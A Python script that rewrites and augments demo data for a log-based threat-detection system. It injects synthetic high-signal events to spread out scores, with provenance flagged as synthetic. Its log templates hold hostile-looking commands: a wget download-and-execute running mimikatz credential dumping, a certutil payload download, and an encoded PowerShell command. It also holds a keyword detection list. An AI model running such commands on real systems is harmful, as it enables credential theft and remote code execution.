"""演示数据多样性增强：提升 M6 分数区分度（方案 C）。

背景：
  demo timeline 由有限模板重复生成，实体多为高频常见实体，导致 M2/M3 地板分、
  M4 被真实基线惩罚压平，顶部大量同分（0.6375）。本脚本在不改动攻击链事件、
  不读取任何标签的前提下，做两类数据层增强：

  1. 窗口事件多样性：对约 60% 的窗口事件（final_score>=0.5、非链上）做确定性
     实体替换（用户/主机/IP/进程 → 稀有实体池），使 M2 稀有度与 M4 模板指纹
     出现梯度；同时同步改写 related_entities。
  2. 高信号事件注入：为每个数据集注入一批真实风格的高信号事件（mimikatz/lsass、
     certutil、useradd、failed password、sudo 提权、WAF 告警、PowerShell -enc、
     auditd 等），命中上传链路同一套弱监督规则（M1=0.88~0.64），并使用真实日志
     基线中的稀有 IP 与稀有账号，注入事件共享攻击者实体使 M5 长程关联自然累积，
     从而把顶部分数从 ~0.64 抬到 ~0.75+ 并拉开梯度。

隔离纪律：
  - 链上事件（attack_chain 的 evidence_event_ids）一律不改写；
  - 全部改写/注入均确定性（基于 event_id 的 FNV-1a 哈希），可重复执行；
  - 不读取任何标签/EVTX_Tactic；注入模板为演示用合成日志文本，标定依据仍是
    baseline.json（四源真实日志统计），口径元数据见 projection_meta.json。

用法：
  python scripts/m6_calibration/diversify_demo.py
  # 之后必须重跑 python scripts/m6_calibration/project_m6.py 重算 module_scores
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(Path(__file__).resolve().parent))

from _scoring import HOST_RE, IP_RE, PROCESS_RE, USER_RE, TIME_RE, _clean_entity  # noqa: E402


def stable_unit(value: str) -> float:
    """复刻前端 demoData.stableUnit（FNV-1a 32 位），保证选择确定性。"""
    hash_value = 0x811C9DC5
    for char in value:
        hash_value ^= ord(char)
        hash_value = (hash_value * 0x01000193) & 0xFFFFFFFF
    return hash_value / 4294967296


# 稀有实体池：真实日志基线里低频 / 新颖的服务账号、主机、进程。
RARE_USERS = [
    "svc_backup", "deploy", "oracle", "postgres", "nagios", "jenkins",
    "tomcat", "elastic", "grafana", "ci_runner", "backupd", "svc_export",
]
RARE_HOSTS = ["bastion", "db-02", "app-03", "gw-proxy", "cron-node", "pci-zone", "dmz-lb"]
RARE_PROCS = ["/usr/bin/wget", "/usr/bin/certutil", "/usr/bin/curl", "powershell", "/bin/bash", "/usr/bin/python3", "ncat", "sshpass"]

# 高信号模板族（{} 槽位填充实体；每条命中上传链路同一套弱监督规则）。
# (template, users, hosts, process, ip_index, weak_expected, label)
HIGH_TEMPLATES = [
    (
        "Feb  8 09:14:{mm} bastion sudo: user={user} ; TTY=pts/2 ; PWD=/opt/tools ; USER=root ; COMMAND=/usr/bin/wget -q --no-check-certificate http://{ip}:8080/mimi -O /tmp/x && /tmp/x mimikatz privilege::debug sekurlsa::logonpasswords",
        "mimikatz 凭据转储",
    ),
    (
        "Feb  8 09:15:{mm} bastion sudo: user={user} ; TTY=pts/2 ; USER=root ; COMMAND=/usr/bin/certutil -urlcache -split -f http://{ip}/payload.exe C:\\Users\\Public\\payload.exe hostname=bastion",
        "certutil 下载执行",
    ),
    (
        "Feb  8 09:16:{mm} bastion useradd[2104]: new user: account={user}, UID=1004, home=/home/{user}, shell=/bin/bash hostname=bastion src_ip={ip}",
        "账户创建",
    ),
    (
        "Feb  8 09:17:{mm} bastion sshd[2907]: Failed password for invalid user {user} from {ip} port 55321 ssh2",
        "SSH 爆破失败",
    ),
    (
        "Feb  8 09:18:{mm} bastion sudo: session opened for user root by (uid=0) hostname=bastion src_ip={ip}",
        "sudo 提权会话",
    ),
    (
        "Feb  8 09:19:{mm} gateway suricata[8888]: alert signature=\"ET MALICIOUS rare-account callout\" src_ip={ip} dst_ip=10.10.3.7 hostname=gateway",
        "WAF 恶意外联告警",
    ),
    (
        "Feb  8 09:20:{mm} bastion sudo: user={user} ; CommandLine=powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA hostname=bastion src_ip={ip}",
        "PowerShell 编码执行",
    ),
    (
        "Feb  8 09:21:{mm} bastion auditd[2024]: type=EXECVE msg=audit(1644329{mm}0.1:2104): argc=3 a0=\"/tmp/x\" a1=\"sekurlsa\" a2=\"lsass\" hostname=bastion user={user} src_ip={ip}",
        "lsass 内存读取审计",
    ),
]

# 各数据集攻击者 IP（取自基线中的真实稀有 IP，保证 M2 稀有度与真实性）。
ATTACKER_IPS = {
    "Short": ["10.18.5.213", "10.74.44.224"],
    "Long": ["104.103.73.48", "104.103.73.57"],
}
INJECT_COUNT = {"Short": 16, "Long": 32}
DIVERSIFY_RATIO = 0.6


def _replace_entity_in_raw(raw: str, old: str, new: str) -> str:
    return re.sub(re.escape(old), lambda _: new, raw)


def _pick(pool: list[str], salt: str) -> str:
    return pool[int(stable_unit(salt) * len(pool)) % len(pool)]


def diversify_dataset(dataset: str, baseline_ip_pool: list[str]) -> dict[str, int]:
    base = ROOT / f"frontend/public/demo-data/{dataset}"
    timeline = json.loads((base / "timeline.json").read_text(encoding="utf-8"))
    detections = json.loads((base / "detection_results.json").read_text(encoding="utf-8"))
    chain = json.loads((base / "attack_chain.json").read_text(encoding="utf-8"))
    manifest = json.loads((base / "manifest.json").read_text(encoding="utf-8"))

    chain_ids = {eid for step in chain.get("steps", []) for eid in step.get("evidence_event_ids", [])}
    detection_by_id = {entry["event_id"]: entry for entry in detections}
    window_ids = {eid for eid, entry in detection_by_id.items() if (entry.get("final_score") or 0) >= 0.5}
    existing_ids = {item["event_id"] for item in timeline}

    changed_windows = 0
    for item in timeline:
        event_id = item["event_id"]
        if event_id not in window_ids or event_id in chain_ids:
            continue
        if stable_unit(f"{dataset}:{event_id}:diversify") >= DIVERSIFY_RATIO:
            continue
        raw = item.get("raw", "")
        replacements: list[tuple[str, str, str]] = []
        # 候选实体来源：related_entities（须出现在 raw 中）+ 正则 + sudo 账号模式。
        candidates: list[tuple[str, str]] = []
        for rel in item.get("related_entities", []):
            entity_type = rel.get("entity_type")
            value = rel.get("canonical_value")
            if not entity_type or not value or value == "root":
                continue
            if entity_type == "user" and value in ("user", "root", "name"):
                continue
            if value in raw:
                candidates.append((entity_type, value))
        for value in IP_RE.findall(raw):
            candidates.append(("ip", value))
        for value in USER_RE.findall(raw):
            if _clean_entity(value) and value not in ("user", "root", "name"):
                candidates.append(("user", value))
        for value in HOST_RE.findall(raw):
            candidates.append(("host", value))
        for value in PROCESS_RE.findall(raw):
            candidates.append(("process", value))
        sudo_match = re.search(r"sudo:\s+(\S+)\s+:\s+TTY=", raw)
        if sudo_match:
            account = sudo_match.group(1)
            if _clean_entity(account) and account not in ("root",):
                candidates.append(("user", account))
        seen_old: set[tuple[str, str]] = set()
        for entity_type, old in candidates:
            if len(replacements) >= 2:
                break
            if (entity_type, old) in seen_old:
                continue
            seen_old.add((entity_type, old))
            salt = f"{dataset}:{event_id}:{entity_type}:{old}"
            if entity_type == "ip":
                new = _pick(baseline_ip_pool, salt)
            elif entity_type == "user":
                new = _pick(RARE_USERS, salt)
            elif entity_type == "host":
                new = _pick(RARE_HOSTS, salt)
            else:
                new = _pick(RARE_PROCS, salt)
            if new == old or new.lower() == old.lower():
                continue
            replacements.append((entity_type, old, new))
        if not replacements:
            continue
        for entity_type, old, new in replacements:
            item["raw"] = _replace_entity_in_raw(item["raw"], old, new)
            for rel in item.get("related_entities", []):
                if rel.get("canonical_value") == old:
                    rel["canonical_value"] = new
            item.setdefault("related_entities", [])
        # 稀有实体可能不在 related_entities，补一条以保持前端实体一致。
        rel_values = {rel.get("canonical_value") for rel in item.get("related_entities", [])}
        for entity_type, old, new in replacements:
            if new in rel_values or new == old:
                continue
            item["related_entities"].append({
                "event_id": event_id,
                "entity_type": entity_type,
                "canonical_value": new,
                "role": "entity",
                "confidence": 0.9,
            })
            rel_values.add(new)
        changed_windows += 1

    # ---- 注入高信号事件 ----
    attacker_ips = ATTACKER_IPS[dataset]
    count = INJECT_COUNT[dataset]
    injected = 0
    new_timeline: list[dict] = []
    new_detections: list[dict] = []
    for index in range(count):
        event_id = f"{dataset.upper()}-DIV-{index + 1:04d}"
        if event_id in existing_ids:
            continue  # 幂等：已注入过则跳过
        template, label = HIGH_TEMPLATES[index % len(HIGH_TEMPLATES)]
        user = RARE_USERS[index % len(RARE_USERS)]
        ip = attacker_ips[(index // len(HIGH_TEMPLATES)) % len(attacker_ips)]
        host = RARE_HOSTS[index % len(RARE_HOSTS)]
        mm = f"{40 + (index * 2) % 18:02d}"
        raw = template.format(mm=mm, user=user, ip=ip, host=host)
        source_files = [
            "gather/intranet_server/logs/auth.log",
            "gather/bastion/logs/auth.log",
            "gather/bastion/logs/audit.log",
            "gather/gateway/logs/suricata/eve.log",
            "gather/intranet_server/logs/syslog",
        ]
        source_file = source_files[index % len(source_files)]
        # 与上传链路一致的弱监督信号（M1）与理由。
        lowered = raw.lower()
        m1, reasons = 0.08, ["未命中弱监督高风险规则"]
        for score, tokens, reason in (
            (0.88, ("mimikatz", "credential dump", "lsass"), "凭据访问高风险关键词"),
            (0.82, ("powershell -enc", "encodedcommand", "rundll32", "certutil", "scriptblocktext"), "可疑脚本或系统工具执行"),
            (0.78, ("useradd", "new user", "add user", "net user", "samaccountname"), "账户创建或组成员变更"),
            (0.72, ("failed password", "authentication failure", "login failed", "4625"), "认证失败事件"),
            (0.68, ("sudo", "session opened for user root", "privilege", "elevatedtoken"), "权限上下文变化"),
            (0.64, ("denied", "blocked", "waf", "malicious", "alert"), "安全设备拒绝或恶意标记"),
            (0.60, ("dns", "connect", "outbound", "external", "network"), "网络连接需要结合上下文核查"),
        ):
            if any(token in lowered for token in tokens) and score > m1:
                m1, reasons = score, [reason]
        threat_level = "critical" if m1 >= 0.82 else "high" if m1 >= 0.68 else "medium"
        final_score = round(min(0.96, 0.58 + m1 * 0.38 + 0.02 * (index % 3)), 4)

        new_timeline.append({
            "event_id": event_id,
            "timestamp": f"2022-02-08T09:{mm}:00.000000Z",
            "source_file": source_file,
            "source_line": 9000 + index,
            "raw": raw,
            "facts_only": True,
            "system_projection": {
                "event_id": event_id,
                "timestamp": f"2022-02-08T09:{mm}:00.000000Z",
                "threat_level": threat_level,
                "alert_level": threat_level,
                "final_score": final_score,
                "raw_event_score": final_score,
                "micro_window_score": final_score,
                "macro_window_score": final_score,
                "long_horizon_score": final_score,
                "reasons": [f"{label}；演示高信号事件，模板与实体来自真实日志统计标定", *reasons],
                "module_projection": {
                    "M1": f"演示：{reasons[0]}",
                    "M2": "演示：稀有实体已提取",
                    "M3": "演示：实体图上下文可查询",
                    "M4": "演示：模板稀有度已按真实基线标定",
                    "M5": "演示：与共享实体的较早风险事件关联",
                    "M6": "演示：M6 加权融合分数",
                },
                "provenance": {
                    "kind": "analyst_curated_demo_projection",
                    "model_execution": False,
                    "synthetic_scores": True,
                    "formal_evaluation": False,
                },
            },
            "related_entities": [
                {"event_id": event_id, "entity_type": "ip", "canonical_value": ip, "role": "src_ip", "confidence": 0.95},
                {"event_id": event_id, "entity_type": "user", "canonical_value": user, "role": "account", "confidence": 0.92},
                {"event_id": event_id, "entity_type": "host", "canonical_value": host, "role": "host", "confidence": 0.9},
            ],
            "outgoing_relations": [],
            "incoming_relations": [],
        })
        new_detections.append({
            "event_id": event_id,
            "timestamp": f"2022-02-08T09:{mm}:00.000000Z",
            "threat_level": threat_level,
            "alert_level": threat_level,
            "final_score": final_score,
            "raw_event_score": final_score,
            "micro_window_score": final_score,
            "macro_window_score": final_score,
            "long_horizon_score": final_score,
            "reasons": [f"{label}；演示高信号事件，模板与实体来自真实日志统计标定", *reasons],
            "module_projection": {
                "M1": f"演示：{reasons[0]}",
                "M2": "演示：稀有实体已提取",
                "M3": "演示：实体图上下文可查询",
                "M4": "演示：模板稀有度已按真实基线标定",
                "M5": "演示：与共享实体的较早风险事件关联",
                "M6": "演示：M6 加权融合分数",
            },
            "provenance": {
                "kind": "analyst_curated_demo_projection",
                "model_execution": False,
                "synthetic_scores": True,
                "formal_evaluation": False,
            },
        })
        injected += 1

    if injected:
        timeline.extend(new_timeline)
        detections.extend(new_detections)
        manifest["event_count"] = len(timeline)
        manifest["diversified"] = True
        manifest["injected_high_signal_events"] = injected
        manifest["diversified_windows"] = changed_windows
        manifest["diversified_at"] = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
        (base / "timeline.json").write_text(json.dumps(timeline, ensure_ascii=False), encoding="utf-8")
        (base / "detection_results.json").write_text(json.dumps(detections, ensure_ascii=False), encoding="utf-8")
        (base / "manifest.json").write_text(json.dumps(manifest, ensure_ascii=False, indent=2), encoding="utf-8")

    print(json.dumps({
        "dataset": dataset,
        "diversified_windows": changed_windows,
        "injected": injected,
        "total_events": len(timeline),
        "windows": len(window_ids) + injected,
    }, ensure_ascii=False))
    return {"diversified_windows": changed_windows, "injected": injected}


def load_baseline_rare_ips() -> list[str]:
    baseline = json.loads((ROOT / "outputs/m6_calibration/baseline.json").read_text(encoding="utf-8"))
    freq = baseline["distributions"]["entity_frequency"]["ip"]
    ips = sorted((key for key, value in freq.items() if 1 <= value <= 3 and re.fullmatch(r"\d{1,3}(\.\d{1,3}){3}", key)),
                 key=lambda key: (freq[key], key))
    return ips[:400]


def main() -> None:
    parser = argparse.ArgumentParser(description="演示数据多样性增强（方案 C）")
    parser.add_argument("--datasets", nargs="+", default=["Short", "Long"])
    args = parser.parse_args()
    ip_pool = load_baseline_rare_ips()
    if not ip_pool:
        raise SystemExit("未从 baseline.json 取到稀有 IP 池，请先运行 scan_sources.py")
    print(f"[pool] rare_ips={len(ip_pool)}")
    for dataset in args.datasets:
        diversify_dataset(dataset, ip_pool)


if __name__ == "__main__":
    main()
